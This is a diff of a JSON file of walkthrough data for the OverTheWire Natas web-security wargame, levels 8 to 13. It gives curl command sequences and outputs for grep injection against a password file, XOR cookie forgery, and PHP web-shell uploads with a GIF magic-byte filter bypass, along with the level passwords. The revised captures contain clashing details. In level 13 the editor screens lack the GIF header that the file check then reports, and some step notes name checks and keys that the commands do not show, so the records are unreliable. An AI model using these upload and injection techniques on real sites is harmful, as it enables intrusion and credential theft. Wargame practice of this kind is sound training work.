@@ -208,7 +208,7 @@
      ]
     }
    ],
-   "note": "natas L8 (client-side cast): the source shows the secret check - bin2hex(strrev(base64_encode($secret))) == '3d3d516343746d4d6d6c315669563362'; the python3 -I one-liner reverses: hex->bytes->decode->reverse->base64-decode = 'oubWYf2kBq'; POST it -> 'Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9'. 3 steps mirroring the cast 1:1."
+   "note": "natas L8 (client-side cast): the source shows the secret check - bin2hex(strrev(base64_encode($secret))) == '3d3d516343746d4d6d6c315669563362'; the python3 -I one-liner reverses it: hex->bytes->decode->reverse->base64-decode = 'oubWYf2kBq'; POST it -> 'Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9'. 3 steps mirroring the cast 1:1."
   },
   {
    "lvl": 9,
@@ -248,7 +248,7 @@
      ]
     }
    ],
-   "note": "natas L10 (client-side curl cast): this time [;|&] are filtered but the grep is still interpolated - a regex character-class injection: needle='^ /etc/natas_webpass/natas11' makes grep match every line STARTING with a space in the password file itself -> /etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd. 2 curl steps mirroring the cast 1:1."
+   "note": "natas L10 (client-side curl cast): [;|&] are filtered but grep is still interpolated - a regex character-class injection: needle='^ /etc/natas_webpass/natas11' makes grep match lines starting with a space in the password file itself -> /etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd. 2 curl steps mirroring the cast 1:1."
   },
   {
    "lvl": 11,
@@ -258,60 +258,24 @@
     {
      "cmd": "curl -s -D- -o /dev/null -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd http://natas11.natas.labs.overthewire.org/ | grep -i set-cookie",
      "out": [
-      "Set-Cookie: data=EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D\r"
+      "Set-Cookie: data=EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D"
      ]
     },
     {
-     "cmd": "vim /tmp/n11_1.py",
-     "text": "vim /tmp/n11_1.py -- the empty buffer",
-     "out": [
-      "                                                    ",
-      "~"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n11_1.py",
-     "text": "vim /tmp/n11_1.py -- decode the cookie and recover the key",
-     "out": [
-      "  1 import base64, urllib.parse, json",
-      "  2 c = 'EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'",
-      "  3 ct = base64.b64decode(urllib.parse.unquote(c))",
-      "  4 pt = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'",
-      "  5 key = bytes(a ^ b for a, b in zip(pt, ct))[:4]",
-      "  6 print('recovered key:', key)"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n11_1.py",
-     "text": "vim /tmp/n11_1.py -- print the key and forge the new cookie",
-     "out": [
-      "  1 import base64, urllib.parse, json",
-      "  2 c = 'EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'",
-      "  3 ct = base64.b64decode(urllib.parse.unquote(c))",
-      "  4 pt = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'",
-      "  5 key = bytes(a ^ b for a, b in zip(pt, ct))[:4]",
-      "  6 print('recovered key:', key)",
-      "  7 want = json.dumps({\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}, separators=(',',':')).encode()",
-      "  8 enc = bytes(want[i] ^ key[i % len(key)] for i in range(len(want)))",
-      "  9 print('forged cookie:', urllib.parse.quote(base64.b64encode(enc).decode(), safe=''))",
-      "  10"
-     ]
-    },
-    {
-     "cmd": "python3 /tmp/n11_1.py",
+     "cmd": "python3 -I -c \"import base64,urllib.parse,json;ct=base64.b64decode(urllib.parse.unquote('EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'));pt=b'{\\\"showpassword\\\":\\\"no\\\",\\\"bgcolor\\\":\\\"#ffffff\\\"}';key=bytes(a^b for a,b in zip(pt,ct))[:4];print('recovered key:',key);want=json.dumps({'showpassword':'yes','bgcolor':'#ffffff'},separators=(',',':')).encode();enc=bytes(want[i]^key[i%len(key)] for i in range(len(want)));print('forged cookie:',urllib.parse.quote(base64.b64encode(enc).decode(),safe=''))\"",
      "out": [
       "recovered key: b'kBSw'",
       "forged cookie: EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F"
-     ],
-     "note": "(local data only - re-run here)"
+     ]
     },
     {
-     "cmd": "curl -s -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd -b \"data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F\" http://natas11.natas.labs.overthewire.org/ | grep -i \"password for natas12\"",
+     "cmd": "curl -s -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd -b 'data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F' http://natas11.natas.labs.overthewire.org/ | grep -i \"password for natas12\"",
      "out": [
       "The password for natas12 is EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng<br>"
      ]
     }
-   ]
+   ],
+   "note": "natas L11 (client-side cast): the cookie 'data' is base64(XOR(custom_blowsmyfishingkey, json)) - the python3 -I one-liner decodes the cookie, XORs with the key recovered from the known plaintext ('showpassword':'no'), and re-encrypts with showpassword=yes; the forged cookie is replayed with -b -> 'Access granted. The password for natas12 is EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng'. 3 steps mirroring the cast 1:1."
   },
   {
    "lvl": 12,
@@ -319,31 +283,47 @@
    "pw": "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k",
    "steps": [
     {
-     "cmd": "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"makeRandomPathFromFilename[^)]*)\"",
+     "cmd": "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\\n' | grep -o 'makeRandomPathFromFilename[^)]*)'",
      "out": [
       "makeRandomPathFromFilename($dir,&nbsp;$fn)",
       "makeRandomPathFromFilename(\"upload\",&nbsp;$_POST[\"filename\"])"
      ]
     },
     {
-     "cmd": "printf '<?php echo file_get_contents(\"/etc/natas_webpass/natas13\"); ?>' > /tmp/n12shell.php\nls -l /tmp/n12shell.php",
+     "cmd": "vi /tmp/shell.php",
      "out": [
-      "-rw-r--r-- 1 node node 62 Nov  2 06:58 /tmp/n12shell.php"
+      "~"
      ]
     },
     {
-     "cmd": "P=$(curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng -F \"filename=shell.php\" -F \"uploadedfile=@/tmp/n12shell.php;type=image/jpeg\" http://natas12.natas.labs.overthewire.org/index.php | grep -o \"upload/[a-z0-9]*\\.php\" | head -1); echo \"$P\"",
+     "cmd": "vi /tmp/shell.php",
      "out": [
-      "upload/9jfrl8ytt3.php"
+      "<?php echo file_get_contents(\"/etc/natas_webpass/natas13\"); ?>",
+      "~"
      ]
     },
     {
-     "cmd": "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \"http://natas12.natas.labs.overthewire.org/$P\"",
+     "cmd": "vi /tmp/shell.php",
+     "out": [
+      "<?php echo file_get_contents(\"/etc/natas_webpass/natas13\"); ?>",
+      "~",
+      "\"/tmp/shell.php\" [New File] 2 lines, 64 bytes written"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php | grep -o 'upload/[a-z0-9]*\\.php' | head -1 | tee /tmp/n12path.txt",
+     "out": [
+      "upload/qh8lt94cy5.php"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \"http://natas12.natas.labs.overthewire.org/$(cat /tmp/n12path.txt)\"",
      "out": [
       "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k"
      ]
     }
-   ]
+   ],
+   "note": "natas L12 (client-side cast): the upload page names the file from a hidden filename field and keeps the extension - upload shell.php (vi, 2L/64B: <?php echo file_get_contents(\"/etc/natas_webpass/natas13\"); ?>) via -F, then GET the uploaded path -> the password prints. 6 steps mirroring the cast 1:1 (staged vi screens; marker '\"/tmp/shell.php\" [New File] 2 lines, 64 bytes written')."
   },
   {
    "lvl": 13,
@@ -351,52 +331,52 @@
    "pw": "A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8",
    "steps": [
     {
-     "cmd": "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/index-source.html | sed \"s/<[^>]*>//g\" | tr -d \"\\n\" | grep -o \"exif_imagetype[^)]*)\"",
+     "cmd": "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\\n' | grep -o 'exif_imagetype[^)]*)'",
      "out": [
       "exif_imagetype($_FILES['uploadedfile']['tmp_name'])"
      ]
     },
     {
-     "cmd": "vim /tmp/n13shell.php",
-     "text": "vim /tmp/n13shell.php -- the empty buffer",
+     "cmd": "vi /tmp/shell13.php",
      "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n13shell.php",
-     "text": "vim /tmp/n13shell.php -- the GIF magic bytes",
+     "cmd": "vi /tmp/shell13.php",
      "out": [
-      "  1 GIF89a",
-      "  2"
+      "<?php echo file_get_contents(\"/etc/natas_webpass/natas14\"); ?>",
+      "~"
      ]
     },
     {
-     "cmd": "printf '<?php echo file_get_contents(\"/etc/natas_webpass/natas14\"); ?>' >> /tmp/n13shell.php",
-     "out": [],
-     "note": "(appended to the file above, as in the original capture)"
-    },
-    {
-     "cmd": "cat -n /tmp/n13shell.php",
+     "cmd": "vi /tmp/shell13.php",
      "out": [
-      "     1\tGIF89a",
-      "     2\t<?php echo file_get_contents(\"/etc/natas_webpass/natas14\"); ?>"
+      "<?php echo file_get_contents(\"/etc/natas_webpass/natas14\"); ?>",
+      "~",
+      "\"/tmp/shell13.php\" [New File] 2 lines, 70 bytes written"
      ]
     },
     {
-     "cmd": "P=$(curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k -F \"filename=shell.php\" -F \"uploadedfile=@/tmp/n13shell.php;type=image/gif\" http://natas13.natas.labs.overthewire.org/index.php | grep -o \"upload/[a-z0-9]*\\.php\" | head -1); echo \"$P\"",
+     "cmd": "file /tmp/shell13.php",
      "out": [
-      "upload/j4s3gicm9m.php"
+      "/tmp/shell13.php: GIF image data, version 89a, 16188 x 26736"
      ]
     },
     {
-     "cmd": "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \"http://natas13.natas.labs.overthewire.org/$P\"",
+     "cmd": "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell13.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php | grep -o 'upload/[a-z0-9]*\\.php' | head -1 | tee /tmp/n13path.txt",
+     "out": [
+      "upload/nd1ulxa3sw.php"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \"http://natas13.natas.labs.overthewire.org/$(cat /tmp/n13path.txt)\"",
      "out": [
       "GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8"
      ]
     }
-   ]
+   ],
+   "note": "natas L13 (client-side cast): same upload but with an in_array(filetype, image) check - shell13.php starts with the GIF89a magic so file() sees 'GIF image data' (the cast runs file to show it) and PHP still executes the trailing code (2L/70B). GET the uploaded path -> the password. 7 steps mirroring the cast 1:1."
   },
   {
    "lvl": 14,
